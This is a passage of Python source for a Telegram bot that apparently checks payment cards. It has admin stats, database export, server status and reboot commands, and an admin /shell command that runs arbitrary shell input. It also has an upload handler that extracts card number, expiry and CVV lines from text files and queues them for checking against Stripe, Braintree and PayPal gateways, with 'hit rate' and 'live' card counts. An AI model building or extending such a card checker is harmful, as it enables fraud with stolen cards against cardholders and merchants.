    import time as _time
    t1 = _time.time()
    bot.answer_callback_query(call.id, "Pinging...", show_alert=False)
    latency = round((_time.time() - t1) * 1000)
    bot.answer_callback_query(call.id, f"🏓 Pong! Latency: {latency}ms", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'stats_inline')
def stats_inline_callback(call):
    try:
        total_users   = db.get_user_count()
        total_checks  = db.get_card_checks_count()
        total_queries = db.get_all_queries_count()
        today         = db.get_today_stats()
        today_checks  = today.get('checks', 0)
        today_live    = today.get('approved', 0)
        today_active  = today.get('active_users', 0)
        bot.answer_callback_query(
            call.id,
            f"📊 Bot Statistics\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👥 Total Users   : {total_users}\n"
            f"🔍 Total Checks  : {total_checks}\n"
            f"📋 Total Queries : {total_queries}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📅 Today Checks  : {today_checks}\n"
            f"✅ Today Live    : {today_live}\n"
            f"🧑 Today Active  : {today_active}",
            show_alert=True
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Stats error: {str(e)[:80]}", show_alert=True)

@bot.message_handler(commands=["dbstats"])
def dbstats_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    total_users = db.get_user_count()
    total_queries = db.get_all_queries_count()
    total_checks = db.get_card_checks_count()
    today = db.get_today_stats()
    gw_stats = db.get_gateway_stats()

    gw_text = ""
    for gw, total, approved in gw_stats:
        rate = (approved / total * 100) if total > 0 else 0
        gw_text += f"  ├ {gw}: {total} checks ({approved} approved, {rate:.1f}%)\n"

    top_users = db.get_top_users(5)
    top_text = ""
    for uid, uname, fname, plan, qcount in top_users:
        name = uname or fname or str(uid)
        top_text += f"  ├ @{name} [{plan}]: {qcount} queries\n"

    stats_msg = f"""<b>📊 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀
━━━━━━━━━━━━━━━━━━━━
👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {total_users}
💬 𝗧𝗼𝘁𝗮𝗹 𝗤𝘂𝗲𝗿𝗶𝗲𝘀: {total_queries}
💳 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝘀: {total_checks}

📅 𝗧𝗼𝗱𝗮𝘆:
  ├ 𝗤𝘂𝗲𝗿𝗶𝗲𝘀: {today['queries']}
  ├ 𝗖𝗵𝗲𝗰𝗸𝘀: {today['checks']}
  ├ 𝗔𝗰𝘁𝗶𝘃𝗲 𝗨𝘀𝗲𝗿𝘀: {today['active_users']}
  └ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {today['approved']}

🔗 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗦𝘁𝗮𝘁𝘀:
{gw_text if gw_text else '  └ No data yet'}

🏆 𝗧𝗼𝗽 𝗨𝘀𝗲𝗿𝘀:
{top_text if top_text else '  └ No data yet'}
━━━━━━━━━━━━━━━━━━━━</b>"""

    bot.reply_to(message, stats_msg)

@bot.message_handler(commands=["history"])
def history_command(message):
    id = message.from_user.id
    log_command(message, query_type='command')

    checks = db.get_user_card_checks(id, limit=10)
    if not checks:
        bot.reply_to(message, "<b>📭 𝗡𝗼 𝗰𝗵𝗲𝗰𝗸 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 𝗳𝗼𝘂𝗻𝗱.</b>")
        return

    history_text = "<b>📜 𝗬𝗼𝘂𝗿 𝗟𝗮𝘀𝘁 10 𝗖𝗵𝗲𝗰𝗸𝘀:\n━━━━━━━━━━━━━━━━━━━━\n</b>"
    for i, (card_bin, gateway, result, ts, exec_time) in enumerate(checks, 1):
        exec_str = f"{exec_time:.1f}s" if exec_time else "N/A"
        history_text += f"<b>{i}. 💳 {card_bin} | {gateway}\n   ├ {result}\n   ├ ⏱ {exec_str}\n   └ 📅 {ts}\n\n</b>"

    bot.reply_to(message, history_text)

@bot.message_handler(commands=["dbexport"])
def dbexport_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    try:
        csv_file = db.export_to_csv()
        if csv_file:
            with open(csv_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="<b>📊 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗘𝘅𝗽𝗼𝗿𝘁 (CSV)</b>")
            os.remove(csv_file)

        json_file = db.export_to_json()
        if json_file:
            with open(json_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="<b>📊 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗘𝘅𝗽𝗼𝗿𝘁 (JSON)</b>")
            os.remove(json_file)
    except Exception as e:
        bot.reply_to(message, f"<b>❌ 𝗘𝘅𝗽𝗼𝗿𝘁 𝗲𝗿𝗿𝗼𝗿: {str(e)}</b>")

@bot.message_handler(commands=["dbbackup"])
def dbbackup_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    backup_file = db.backup_database()
    if backup_file:
        with open(backup_file, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"<b>💾 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗕𝗮𝗰𝗸𝘂𝗽\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}</b>")
    else:
        bot.reply_to(message, "<b>❌ 𝗕𝗮𝗰𝗸𝘂𝗽 𝗳𝗮𝗶𝗹𝗲𝗱.</b>")

@bot.message_handler(commands=["dbsearch"])
def dbsearch_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    try:
        search_term = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "<b>𝗨𝘀𝗮𝗴𝗲: /dbsearch &lt;term&gt;</b>")
        return

    results = db.search_queries(search_term)
    if not results:
        bot.reply_to(message, f"<b>🔍 𝗡𝗼 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝗳𝗼𝗿 '{search_term}'</b>")
        return

    text = f"<b>🔍 𝗦𝗲𝗮𝗿𝗰𝗵 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝗳𝗼𝗿 '{search_term}':\n━━━━━━━━━━━━━━━━━━━━\n</b>"
    for i, row in enumerate(results[:10], 1):
        if len(row) == 4:
            uid, query, resp, ts = row
            text += f"<b>{i}. 👤 {uid}\n   ├ {query[:50]}\n   └ 📅 {ts}\n\n</b>"
        else:
            query, resp, ts = row
            text += f"<b>{i}. {query[:50]}\n   └ 📅 {ts}\n\n</b>"

    bot.reply_to(message, text)

@bot.message_handler(commands=["ping"])
def ping_command(message):
    log_command(message, query_type='command')
    sent = bot.reply_to(message, "🏓 <b>Pinging...</b>")
    latency_ms = round((time.time() - message.date) * 1000)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent.message_id,
        text=(
            "┌─────────────────────────┐\n"
            "│  🏓  <b>PONG!</b>                 │\n"
            "├─────────────────────────┤\n"
            f"│  ⚡ Latency: <b>{latency_ms} ms</b>       │\n"
            "│  ✅ Status:  <b>Online</b>        │\n"
            "│  🤖 Bot:     <b>Responsive</b>    │\n"
            "└─────────────────────────┘"
        ),
        parse_mode="HTML"
    )


def _get_public_ip():
    """Get server public IP."""
    try:
        return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception:
        return "N/A"

def _get_location_info(ip=None):
    """Get geo/ISP info for server IP. Primary: ipwho.is  Fallback: ipinfo.io  Final: ip-api.com (HTTP)."""
    _ip = ip if (ip and ip != "N/A") else ""

    # ── Primary: ipwho.is ──────────────────────────────────────────
    try:
        r = requests.get(f"https://ipwho.is/{_ip}", timeout=6)
        d = r.json()
        if d.get("success"):
            flag     = (d.get("flag") or {}).get("emoji") or _flag(d.get("country_code", ""))
            conn     = d.get("connection") or {}
            tz       = d.get("timezone") or {}
            return {
                "city":     d.get("city", "—"),
                "region":   d.get("region", "—"),
                "country":  d.get("country", "—"),
                "isp":      conn.get("isp") or conn.get("org") or "—",
                "org":      conn.get("org", "—"),
                "flag":     flag,
                "lat":      d.get("latitude", "—"),
                "lon":      d.get("longitude", "—"),
                "timezone": tz.get("id", "—"),
                "asn":      conn.get("asn", "—"),
            }
    except Exception:
        pass

    # ── Fallback 1: ipinfo.io ─────────────────────────────────────
    try:
        r = requests.get(f"https://ipinfo.io/{_ip}/json", timeout=6)
        d = r.json()
        loc  = d.get("loc", "?,?").split(",")
        org  = d.get("org", "—")
        isp  = org.split(" ", 1)[1] if " " in org else org
        code = d.get("country", "")
        return {
            "city":     d.get("city", "—"),
            "region":   d.get("region", "—"),
            "country":  d.get("country", "—"),
            "isp":      isp,
            "org":      org,
            "flag":     _flag(code),
            "lat":      loc[0] if len(loc) > 0 else "—",
            "lon":      loc[1] if len(loc) > 1 else "—",
            "timezone": d.get("timezone", "—"),
            "asn":      "—",
        }
    except Exception:
        pass

    # ── Fallback 2: ip-api.com (HTTP) ─────────────────────────────
    try:
        r = requests.get(f"http://ip-api.com/json/{_ip}", timeout=6)
        d = r.json()
        if d.get("status") == "success":
            return {
                "city":     d.get("city", "—"),
                "region":   d.get("regionName", "—"),
                "country":  d.get("country", "—"),
                "isp":      d.get("isp", "—"),
                "org":      d.get("org", "—"),
                "flag":     _flag(d.get("countryCode", "")),
                "lat":      d.get("lat", "—"),
                "lon":      d.get("lon", "—"),
                "timezone": d.get("timezone", "—"),
                "asn":      "—",
            }
    except Exception:
        pass

    return {"city": "—", "region": "—", "country": "—", "isp": "—", "org": "—",
            "flag": "🌐", "lat": "—", "lon": "—", "timezone": "—", "asn": "—"}

def _get_ping_ms(host="api.telegram.org"):
    """Ping host and return latency in ms."""
    try:
        t = time.time()
        requests.get(f"https://{host}", timeout=5)
        return round((time.time() - t) * 1000)
    except Exception:
        return "N/A"

def _get_cpu_pct():
    """Best-effort CPU usage from /proc/stat."""
    try:
        def _read():
            with open('/proc/stat') as f:
                line = f.readline()
            vals = list(map(int, line.split()[1:]))
            idle  = vals[3]
            total = sum(vals)
            return idle, total
        i1, t1 = _read()
        time.sleep(0.15)
        i2, t2 = _read()
        diff_idle  = i2 - i1
        diff_total = t2 - t1
        pct = (1 - diff_idle / diff_total) * 100 if diff_total else 0
        return f"{pct:.1f}%"
    except Exception:
        return "N/A"

def _get_ram_info():
    """Read RAM info from /proc/meminfo (Linux/Replit)."""
    try:
        mem = {}
        with open('/proc/meminfo', 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    mem[parts[0].rstrip(':')] = int(parts[1])
        total_kb  = mem.get('MemTotal', 0)
        avail_kb  = mem.get('MemAvailable', mem.get('MemFree', 0))
        used_kb   = total_kb - avail_kb
        total_mb  = total_kb / 1024
        used_mb   = used_kb  / 1024
        free_mb   = avail_kb / 1024
        pct       = (used_kb / total_kb * 100) if total_kb else 0
        bar_filled = int(pct / 10)
        bar = "█" * bar_filled + "░" * (10 - bar_filled)
        return (f"{used_mb:.0f}MB / {total_mb:.0f}MB  [{bar}] {pct:.1f}%\n"
                f"     Free: {free_mb:.0f}MB")
    except Exception:
        return "N/A"

def _get_disk_info():
    """Read disk usage using shutil."""
    try:
        usage = shutil.disk_usage('/')
        total_gb = usage.total / (1024**3)
        used_gb  = usage.used  / (1024**3)
        free_gb  = usage.free  / (1024**3)
        pct      = usage.used / usage.total * 100
        bar_filled = int(pct / 10)
        bar = "█" * bar_filled + "░" * (10 - bar_filled)
        return (f"{used_gb:.1f}GB / {total_gb:.1f}GB  [{bar}] {pct:.1f}%\n"
                f"     Free: {free_gb:.1f}GB")
    except Exception:
        return "N/A"

@bot.message_handler(commands=["status"])
def status_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 This command is restricted to admins only.</b>", parse_mode='HTML')
        return
    log_command(message, query_type='command')

    wait_msg = bot.reply_to(message, "<b>⚙️ Fetching server status...</b>", parse_mode='HTML')

    uptime_secs = int(time.time() - BOT_START_TIME)
    hours   = uptime_secs // 3600
    minutes = (uptime_secs % 3600) // 60
    seconds = uptime_secs % 60

    now_str  = datetime.now().strftime("%d %b %Y • %H:%M:%S")
    pub_ip   = _get_public_ip()
    loc      = _get_location_info(pub_ip)
    ping_tg  = _get_ping_ms("api.telegram.org")
    ping_gw  = _get_ping_ms("stripe.com")
    cpu      = _get_cpu_pct()
    ram      = _get_ram_info()
    disk     = _get_disk_info()

    ping_tg_str = f"{ping_tg}ms" if isinstance(ping_tg, int) else ping_tg
    ping_gw_str = f"{ping_gw}ms" if isinstance(ping_gw, int) else ping_gw

    uptime_bar_filled = min(int((uptime_secs % 3600) / 360), 10)
    uptime_bar = "▰" * uptime_bar_filled + "▱" * (10 - uptime_bar_filled)

    ping_tg_icon = "🟢" if isinstance(ping_tg, int) and ping_tg < 200 else ("🟡" if isinstance(ping_tg, int) and ping_tg < 600 else "🔴")
    ping_gw_icon = "🟢" if isinstance(ping_gw, int) and ping_gw < 300 else ("🟡" if isinstance(ping_gw, int) and ping_gw < 700 else "🔴")

    text = (
        "<b>"
        "╔══〔 ⚡ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡ 〕══╗\n"
        "\n"
        "❖  𝗕𝗢𝗧 𝗜𝗡𝗙𝗢\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🟢  Status    ⟫  Online & Active\n"
        f"   ⏱   Uptime    ⟫  {hours:02d}h {minutes:02d}m {seconds:02d}s\n"
        f"   📅  Date      ⟫  {now_str}\n"
        f"   📡  Mode      ⟫  Long Polling\n"
        "\n"
        f"❖  𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗢  {loc['flag']}\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🔌  IP        ⟫  <code>{pub_ip}</code>\n"
        f"   🏙  City      ⟫  {loc['city']}, {loc['region']}\n"
        f"   🌍  Country   ⟫  {loc['country']}\n"
        f"   🏢  ISP       ⟫  {loc['isp']}\n"
        f"   🏛  Org       ⟫  {loc['org']}\n"
        f"   🕐  Timezone  ⟫  {loc['timezone']}\n"
        f"   📍  Coords    ⟫  {loc['lat']}, {loc['lon']}\n"
        "\n"
        "❖  𝗣𝗜𝗡𝗚 / 𝗟𝗔𝗧𝗘𝗡𝗖𝗬\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   {ping_tg_icon}  Telegram  ⟫  {ping_tg_str}\n"
        f"   {ping_gw_icon}  Stripe    ⟫  {ping_gw_str}\n"
        "\n"
        "❖  𝗛𝗔𝗥𝗗𝗪𝗔𝗥𝗘\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🧠  CPU       ⟫  {cpu}\n"
        f"   💾  RAM       ⟫  {ram}\n"
        f"   🗄   Disk      ⟫  {disk}\n"
        "\n"
        f"   ▰▰▰▰ {uptime_bar} ▰▰▰▰\n"
        "╚════════════════════════╝"
        "</b>"
    )
    try:
        bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id,
                              text=text, parse_mode='HTML')
    except Exception:
        bot.reply_to(message, text, parse_mode='HTML')


@bot.message_handler(commands=["stats"])
def stats_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 This command is restricted to admins only.</b>", parse_mode='HTML')
        return
    log_command(message, query_type='command')

    total_users   = db.get_user_count()
    total_cmds    = db.get_all_queries_count()
    total_checks  = db.get_card_checks_count()
    today         = db.get_today_stats()
    gw_stats      = db.get_gateway_stats()

    uptime_secs = int(time.time() - BOT_START_TIME)
    hours   = uptime_secs // 3600
    minutes = (uptime_secs % 3600) // 60
    seconds = uptime_secs % 60
    now_str = datetime.now().strftime("%d %b %Y • %H:%M:%S")

    approved_today = today.get('approved', 0)
    checks_today   = today.get('checks', 0)
    hit_rate = f"{(approved_today/checks_today*100):.1f}%" if checks_today else "—"

    # ── Hit rate bar ──
    hr_pct = (approved_today / checks_today * 100) if checks_today else 0
    hr_filled = int(hr_pct / 10)
    hr_bar = "█" * hr_filled + "░" * (10 - hr_filled)

    # ── Gateway leaderboard ──
    gw_icons = ["🥇", "🥈", "🥉", "🏅"]
    gw_lines = ""
    for i, (gw, total, approved) in enumerate(gw_stats[:4]):
        gw_label = (gw or "Unknown")[:13]
        icon = gw_icons[i] if i < len(gw_icons) else "▪"
        gw_rate = f"{(approved/total*100):.0f}%" if total else "0%"
        gw_lines += f"   {icon}  {gw_label:<13} ⟫  {total} · ✅{approved} · {gw_rate}\n"
    if not gw_lines:
        gw_lines = "   ▪  No gateway data yet\n"

    text = (
        "<b>"
        "╔══〔 📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 📊 〕══╗\n"
        "\n"
        "❖  𝗔𝗟𝗟 𝗧𝗜𝗠𝗘\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   👤  Users      ⟫  {total_users}\n"
        f"   ⌨️   Commands   ⟫  {total_cmds}\n"
        f"   💳  CC Checks  ⟫  {total_checks}\n"
        "\n"
        "❖  𝗧𝗢𝗗𝗔𝗬\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🟣  Active     ⟫  {today.get('active_users', 0)} users\n"
        f"   ⌨️   Commands   ⟫  {today.get('queries', 0)}\n"
        f"   💳  Checks     ⟫  {checks_today}\n"
        f"   ✅  Approved   ⟫  {approved_today}\n"
        f"   🎯  Hit Rate   ⟫  {hit_rate}  [{hr_bar}]\n"
        "\n"
        "❖  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗟𝗘𝗔𝗗𝗘𝗥𝗕𝗢𝗔𝗥𝗗\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        + gw_lines +
        "\n"
        "❖  𝗨𝗣𝗧𝗜𝗠𝗘\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"   🕐  Running    ⟫  {hours:02d}h {minutes:02d}m {seconds:02d}s\n"
        f"   📅  As of      ⟫  {now_str}\n"
        "\n"
        "╚════════════════════════╝"
        "</b>"
    )
    bot.reply_to(message, text, parse_mode='HTML')


@bot.message_handler(commands=["restart"])
def restart_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 Sirf admin use kar sakta hai.</b>", parse_mode='HTML')
        return
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ 𝗬𝗲𝘀, 𝗥𝗲𝘀𝘁𝗮𝗿𝘁", callback_data="confirm_restart"),
        types.InlineKeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹",          callback_data="cancel_restart"),
    )
    bot.reply_to(message,
        "<b>⚠️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧\n\n"
        "🔄 Bot service restart hogi.\n"
        "⏳ ~5-10 seconds downtime.\n\n"
        "Confirm karo?</b>",
        reply_markup=kb, parse_mode='HTML'
    )

@bot.message_handler(commands=["reboot"])
def reboot_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n\n🔐 Sirf admin use kar sakta hai.</b>", parse_mode='HTML')
        return
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ 𝗬𝗲𝘀, 𝗥𝗲𝗯𝗼𝗼𝘁", callback_data="confirm_reboot"),
        types.InlineKeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹",        callback_data="cancel_reboot"),
    )
    bot.reply_to(message,
        "<b>⚠️ 𝗘𝗖𝟮 𝗥𝗘𝗕𝗢𝗢𝗧\n\n"
        "🖥️ Pura AWS EC2 server reboot hoga.\n"
        "⏳ ~60-90 seconds downtime.\n"
        "🔁 Bot auto-start hoga (systemd).\n\n"
        "Confirm karo?</b>",
        reply_markup=kb, parse_mode='HTML'
    )

@bot.message_handler(commands=["logs"])
def logs_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ Access Denied</b>", parse_mode='HTML')
        return
    import subprocess
    args = message.text.strip().split()
    lines = 40
    if len(args) > 1:
        try: lines = max(5, min(200, int(args[1])))
        except Exception: pass
    try:
        result = subprocess.run(
            ['sudo', 'journalctl', '-u', 'st-checker-bot', '--no-pager', '-n', str(lines), '--output=short'],
            capture_output=True, text=True, timeout=10
        )
        log_text = result.stdout or result.stderr or "No logs found"
    except Exception as e:
        log_text = f"Error: {e}"
    chunks = [log_text[i:i+3800] for i in range(0, len(log_text), 3800)]
    for i, chunk in enumerate(chunks[:3]):
        header = f"<b>🖥️ Bot Logs</b> (last {lines} lines)" if i == 0 else f"<b>🖥️ Logs (cont. {i+1})</b>"
        bot.send_message(message.chat.id,
            f"{header}\n<pre>{chunk}</pre>",
            parse_mode='HTML')

@bot.message_handler(commands=["shell"])
def shell_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ Access Denied</b>", parse_mode='HTML')
        return
    import subprocess
    text = message.text.strip()
    parts = text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip():
        bot.reply_to(message,
            "<b>🖥️ Shell Command</b>\n"
            "Usage: <code>/shell &lt;command&gt;</code>\n\n"
            "Examples:\n"
            "<code>/shell ps aux | grep python</code>\n"
            "<code>/shell df -h</code>\n"
            "<code>/shell cat /etc/os-release</code>",
            parse_mode='HTML')
        return
    cmd = parts[1].strip()
    msg = bot.reply_to(message, f"<b>⚙️ Running...</b>\n<code>{cmd}</code>", parse_mode='HTML')
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        stdout = result.stdout or ''
        stderr = result.stderr or ''
        combined = stdout + (f"\n[stderr]\n{stderr}" if stderr.strip() else '')
        output = combined.strip() or "(no output)"
        exit_code = result.returncode
    except subprocess.TimeoutExpired:
        output = "⏰ Command timed out (30s)"
        exit_code = -1
    except Exception as e:
        output = f"Error: {e}"
        exit_code = -1
    chunks = [output[i:i+3800] for i in range(0, len(output), 3800)]
    status = "✅" if exit_code == 0 else f"⚠️ exit={exit_code}"
    header = f"<b>🖥️ Shell {status}</b>\n<code>$ {cmd}</code>\n"
    for i, chunk in enumerate(chunks[:3]):
        if i == 0:
            bot.edit_message_text(
                f"{header}<pre>{chunk}</pre>",
                msg.chat.id, msg.message_id, parse_mode='HTML'
            )
        else:
            bot.send_message(msg.chat.id, f"<pre>{chunk}</pre>", parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data in ("confirm_restart", "cancel_restart",
                                                        "confirm_reboot",  "cancel_reboot"))
def handle_restart_reboot(call):
    uid = call.from_user.id
    if uid != admin:
        bot.answer_callback_query(call.id, "❌ Access Denied")
        return

    data = call.data

    if data == "cancel_restart":
        bot.edit_message_text("<b>❌ Restart cancelled.</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "Cancelled")
        return

    if data == "cancel_reboot":
        bot.edit_message_text("<b>❌ Reboot cancelled.</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id, "Cancelled")
        return

    if data == "confirm_restart":
        bot.edit_message_text(
            "<b>🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 𝗕𝗢𝗧...\n\n"
            "⏳ ~5-10 seconds downtime.\n"
            "✅ Bot will be back shortly.</b>",
            call.message.chat.id, call.message.message_id, parse_mode='HTML'
        )
        bot.answer_callback_query(call.id, "🔄 Restarting bot...")
        def do_restart():
            time.sleep(2)
            import subprocess
            subprocess.Popen(["sudo", "systemctl", "restart", "st-checker-bot"])
        threading.Thread(target=do_restart, daemon=True).start()
        return

    if data == "confirm_reboot":
        bot.edit_message_text(
            "<b>🖥️ 𝗥𝗘𝗕𝗢𝗢𝗧𝗜𝗡𝗚 𝗘𝗖𝟮 𝗦𝗘𝗥𝗩𝗘𝗥...\n\n"
            "⏳ ~60-90 seconds downtime.\n"
            "🔁 Bot auto-start hoga (systemd).\n"
            "✅ Thodi der baad bot wapis aa jayega.</b>",
            call.message.chat.id, call.message.message_id, parse_mode='HTML'
        )
        bot.answer_callback_query(call.id, "🖥️ Rebooting EC2...")
        def do_reboot():
            time.sleep(2)
            import subprocess
            subprocess.Popen(["sudo", "reboot"])
        threading.Thread(target=do_reboot, daemon=True).start()
        return

def auto_backup_scheduler():
    import schedule as sched_module
    sched_module.every(24).hours.do(db.backup_database)
    while True:
        sched_module.run_pending()
        time.sleep(60)

try:
    import schedule
    backup_thread = threading.Thread(target=auto_backup_scheduler, daemon=True)
    backup_thread.start()
    logger.info("Auto backup scheduler started (every 24h)")
except ImportError:
    logger.warning("schedule module not found - auto backup disabled")

print("Bot Start On ✅ ")
print(f"Admin ID: {admin}")
print("للتأكد من صلاحياتك، أرسل /amadmin")

# ── Online notification — ADMIN ONLY ─────────────────────────────────────────
# Sirf admin ko jaati hai — koi bhi user ko start notification nahi milti
try:
    import platform, datetime as _dt
    _now = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    _online_msg = (
        f"<b>⚡ ST-CO ✨ — 🟢 LIVE\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⏰ <code>{_now}</code>\n"
        f"🌐 <code>{platform.node()}</code>\n"
        f"📡 Polling Active ✅\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"   ⌤ YADISTAN 🍀</b>"
    )
    bot.send_message(int(admin), _online_msg, parse_mode='HTML')  # ADMIN ONLY
    print("[BOT] Online notification sent to admin only.")
except Exception as _e:
    print(f"[BOT] Could not send online notification: {_e}")
# ─────────────────────────────────────────────────────────────────────────────

import sys
import signal

# =================== TXT File Upload Handler ===================
_pending_files = {}

@bot.message_handler(content_types=['document'])
def handle_document(message):
    def process():
        id = message.from_user.id
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                jd = json.load(f)
            BL = jd.get(str(id), {}).get('plan', '𝗙𝗥𝗘𝗘')
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗩𝗜𝗣 𝗼𝗻𝗹𝘆 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.</b>", parse_mode='HTML')
            return
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            return
        try:
            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            content = downloaded.decode('utf-8', errors='ignore')
        except Exception as e:
            bot.reply_to(message, f"<b>❌ File download failed: {e}</b>", parse_mode='HTML')
            return
        raw_lines = content.strip().split('\n')
        cc_pattern = re.compile(r'\d{13,19}[|/ ]\d{1,2}[|/ ]\d{2,4}[|/ ]\d{3,4}')
        seen = set()
        cards = []
        for line in raw_lines:
            line = line.strip()
            m = cc_pattern.search(line)
            if m:
                cc = m.group().replace('/', '|').replace(' ', '|')
                if cc not in seen:
                    seen.add(cc)
                    cards.append(cc)
        if not cards:
            bot.reply_to(message, "<b>❌ No valid cards found in file.</b>", parse_mode='HTML')
            return
        dupes = len([l for l in raw_lines if l.strip()]) - len(cards)
        _pending_files[id] = {
            'cards': cards,
            'chat_id': message.chat.id,
            'msg_id': message.message_id,
            'file_name': doc.file_name
        }
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("⚡ Stripe Auth", callback_data='fchk_sa'),
            types.InlineKeyboardButton("💳 Stripe Charge", callback_data='fchk_st'),
        )
        kb.add(
            types.InlineKeyboardButton("🛡️ Braintree VBV", callback_data='fchk_vbv'),
            types.InlineKeyboardButton("💰 PayPal", callback_data='fchk_pp'),
        )
        kb.add(
            types.InlineKeyboardButton("🔍 Non-SK Auth", callback_data='fchk_nonsk'),
        )
        bot.reply_to(
            message,
            f"<b>📂 CC File Detected!\n\n"
            f"📄 File  : <code>{doc.file_name}</code>\n"
            f"💳 Cards : <code>{len(cards)}</code>\n"
            f"🗑️ Dupes  : <code>{max(dupes, 0)}</code>\n\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
            f"⚡ Select gateway to start checking:</b>",
            parse_mode='HTML', reply_markup=kb
        )
    threading.Thread(target=process).start()


def _is_success(result, gw):
    r = result.lower()
